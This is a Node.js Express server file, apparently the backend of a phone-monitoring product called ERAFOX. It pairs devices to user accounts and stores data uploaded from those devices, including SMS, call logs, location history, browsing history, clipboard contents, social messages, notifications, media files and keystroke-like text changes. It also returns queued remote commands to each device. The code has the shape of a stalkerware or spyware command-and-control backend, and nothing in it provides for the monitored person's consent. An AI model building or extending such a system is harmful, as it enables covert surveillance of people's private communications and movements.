import express from 'express'
import cors from 'cors'
import helmet from 'helmet'
import dotenv from 'dotenv'
import { initializeApp, cert } from 'firebase-admin/app'
import { getDatabase } from 'firebase-admin/database'
import { getAuth } from 'firebase-admin/auth'
import rateLimit from 'express-rate-limit'
import fs from 'fs'

dotenv.config()

// Firebase init
let serviceAccount
try {
    serviceAccount = process.env.FIREBASE_SERVICE_ACCOUNT_JSON
        ? JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_JSON)
        : JSON.parse(fs.readFileSync(process.env.FIREBASE_SERVICE_ACCOUNT_PATH, 'utf8'))
} catch (e) {
    console.error('FATAL: Cannot load Firebase service account:', e.message)
    process.exit(1)
}

initializeApp({
    credential: cert(serviceAccount),
    databaseURL: process.env.FIREBASE_DATABASE_URL
})

const db = getDatabase()
const app = express()

// Middleware
app.use(helmet())
app.use(cors({
    origin: process.env.ALLOWED_ORIGINS?.split(',') || '*',
    methods: ['GET', 'POST']
}))
app.use(express.json({ limit: '50mb' }))

// FIX: sanitize deviceId — alphanumeric + underscore + dash, max 64
function sanitizeDeviceId(raw) {
    if (!raw || typeof raw !== 'string') return null
    const clean = raw.replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 64)
    return clean.length > 0 ? clean : null
}

// Rate limiters
const pairLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 10,
    message: { error: 'Too many pairing attempts' }
})

// FIX: keyGenerator uses sanitized deviceId from header or body
const telemetryLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 120,
    keyGenerator: (req) => {
        const fromHeader = sanitizeDeviceId(req.headers['x-device-id'])
        const fromBody = sanitizeDeviceId(req.body?.device_id)
        return fromHeader || fromBody || req.ip
    }
})

// Auth middlewares
const verifyUser = async (req, res, next) => {
    const token = req.headers.authorization?.replace('Bearer ', '')
    if (!token) return res.status(401).json({ error: 'No token' })
    try {
        const decoded = await getAuth().verifyIdToken(token)
        req.uid = decoded.uid
        next()
    } catch {
        res.status(403).json({ error: 'Invalid token' })
    }
}

// FIX: validateDevice — strict device existence + pairing check
const validateDevice = async (req, res, next) => {
    const rawId = req.headers['x-device-id'] || req.body?.device_id
    const deviceId = sanitizeDeviceId(rawId)
    if (!deviceId) return res.status(401).json({ error: 'No device ID' })
    try {
        const snap = await db.ref(`devices/${deviceId}`).once('value')
        if (!snap.exists()) return res.status(403).json({ error: 'Unknown device' })
        const pairedTo = snap.val().pairedTo
        if (!pairedTo) return res.status(403).json({ error: 'Device not paired' })
        req.deviceId = deviceId
        next()
    } catch (e) {
        console.error('validateDevice error:', e)
        res.status(500).json({ error: 'Internal error' })
    }
}

const validateDeviceLoose = async (req, res, next) => {
    const rawId = req.headers['x-device-id'] || req.body?.device_id
    const deviceId = sanitizeDeviceId(rawId)
    if (!deviceId) return res.status(401).json({ error: 'No device ID' })
    req.deviceId = deviceId
    next()
}

// Routes
app.get('/', (req, res) => {
    res.json({ status: 'ERAFOX server v3 running', version: '3.0.0' })
})

// FIX: /telemetry uses validateDeviceLoose (allows pairing) + proper pairing flow
app.post('/api/v2/telemetry', telemetryLimiter, validateDeviceLoose, async (req, res) => {
    try {
        const {
            device_id, timestamp, status, battery,
            interval, pairing_code, pairing_request
        } = req.body

        const deviceId = sanitizeDeviceId(device_id) || req.deviceId

        await db.ref(`devices/${deviceId}`).update({
            lastSeen: timestamp || Date.now(),
            status: status || 'active',
            battery: typeof battery === 'number' ? battery : 0,
            interval: typeof interval === 'number' ? interval : 60,
            updatedAt: Date.now()
        })

        if (pairing_request === true && pairing_code && typeof pairing_code === 'string') {
            // Validate pairing code format: 6 digits
            if(/^\d{6}$/.test(pairing_code)){
                await db.ref(`pairing_requests/${deviceId}`).set({
                    pairing_code: pairing_code,
                    device_id: deviceId,
                    timestamp: Date.now()
                })
            }
        }

        const commandsSnap = await db.ref(`devices/${deviceId}/commands`).orderByChild('timestamp').limitToLast(1).once('value')
        res.json({ success: true, commands: commandsSnap.val() || null })
    } catch (e) {
        console.error('Telemetry error:', e)
        res.status(500).json({ error: e.message })
    }
})

// FIX: /data uses validateDevice (strict) + raw_batches pruning with atomic delete
app.post('/api/v2/data', telemetryLimiter, validateDevice, async (req, res) => {
    try {
        const deviceId = req.deviceId
        const batch = req.body

        // FIX: raw_batches pruning — atomic trim with orderByKey
        const batchRef = db.ref(`devices/${deviceId}/raw_batches`)
        await batchRef.push({ data: batch, receivedAt: Date.now() })

        // Trim: keep only 50 newest
        const countSnap = await batchRef.once('value')
        const count = countSnap.numChildren()
        if (count > 50) {
            const toDelete = count - 50
            const oldestSnap = await batchRef.orderByKey().limitToFirst(toDelete).once('value')
            const updates = {}
            oldestSnap.forEach(child => { updates[child.key] = null })
            if (Object.keys(updates).length > 0) await batchRef.update(updates)
        }

        if (Array.isArray(batch.messages)) {
            const ALLOWED_TYPES = new Set([
                'location', 'sms', 'call', 'app_usage', 'network',
                'browsing_history', 'notification', 'media_file',
                'clipboard', 'social_message', 'window_change', 'text_change'
            ])
            for (const msg of batch.messages) {
                const type = msg.type
                const encryptedContent = typeof msg.content === 'string' ? msg.content : ''
                const ts = typeof msg.timestamp === 'number' ? msg.timestamp : Date.now()

                // Whitelist type
                if (!ALLOWED_TYPES.has(type)) continue

                const payload = {
                    encrypted: encryptedContent,
                    timestamp: ts,
                    receivedAt: Date.now()
                }

                switch (type) {
                    case 'location':
                        // FIX: Don't JSON.parse encrypted content — store as-is
                        await db.ref(`devices/${deviceId}/location_history`).push(payload)
                        await db.ref(`devices/${deviceId}/location`).set({ ...payload, isLatest: true })
                        break
                    case 'sms':
                        await db.ref(`devices/${deviceId}/sms`).push(payload)
                        break
                    case 'call':
                        await db.ref(`devices/${deviceId}/calls`).push(payload)
                        break
                    case 'app_usage':
                        await db.ref(`devices/${deviceId}/app_usage`).push(payload)
                        break
                    case 'network':
                        await db.ref(`devices/${deviceId}/network`).push(payload)
                        break
                    case 'browsing_history':
                        await db.ref(`devices/${deviceId}/browsing_history`).push(payload)
                        break
                    case 'notification':
                        await db.ref(`devices/${deviceId}/notifications`).push(payload)
                        break
                    case 'media_file':
                        await db.ref(`devices/${deviceId}/media_files`).push(payload)
                        break
                    case 'clipboard':
                        await db.ref(`devices/${deviceId}/clipboard`).push(payload)
                        break
                    case 'social_message':
                        await db.ref(`devices/${deviceId}/social_messages`).push(payload)
                        break
                    case 'window_change':
                        await db.ref(`devices/${deviceId}/window_changes`).push(payload)
                        break
                    case 'text_change':
                        await db.ref(`devices/${deviceId}/text_changes`).push(payload)
                        break
                }
            }
        }
        res.json({ success: true, received: batch.messages?.length || 0 })
    } catch (e) {
        console.error('Data error:', e)
        res.status(500).json({ error: e.message })
    }
})

// Pairing
app.post('/api/v2/pair', verifyUser, pairLimiter, async (req, res) => {
    try {
        const { code } = req.body
        const userId = req.uid
        if (!code || !/^\d{6}$/.test(code)) {
            return res.status(400).json({ error: 'Invalid pairing code format' })
        }

        const snap = await db.ref('pairing_requests').once('value')
        const requests = snap.val() || {}
        const entry = Object.entries(requests).find(([_, v]) => v.pairing_code === code)
        if (!entry) return res.status(404).json({ error: 'Invalid pairing code' })

        const [deviceId] = entry
        const existingSnap = await db.ref(`devices/${deviceId}/pairedTo`).once('value')
        if (existingSnap.exists()) {
            return res.status(409).json({ error: 'Device already paired' })
        }

        await db.ref(`users/${userId}/devices/${deviceId}`).set({
            pairedAt: Date.now(),
            pairedCode: code
        })
        await db.ref(`devices/${deviceId}/pairedTo`).set(userId)
        await db.ref(`pairing_requests/${deviceId}`).remove()
        res.json({ success: true, deviceId })
    } catch (e) {
        console.error('Pair error:', e)
        res.status(500).json({ error: e.message })
    }
})

app.get('/api/v2/devices/:deviceId', verifyUser, async (req, res) => {
    try {
        const deviceId = sanitizeDeviceId(req.params.deviceId)
        if (!deviceId) return res.status(400).json({ error: 'Invalid device ID' })
        const access = await db.ref(`users/${req.uid}/devices/${deviceId}`).once('value')
        if (!access.exists()) return res.status(403).json({ error: 'No access' })
        const snap = await db.ref(`devices/${deviceId}`).once('value')
        res.json({ success: true, data: snap.val() })
    } catch (e) {
        res.status(500).json({ error: e.message })
    }
})

const PORT = process.env.PORT || 3000
app.listen(PORT, () => {
    console.log(`ERAFOX server v3 listening on port ${PORT}`)
})
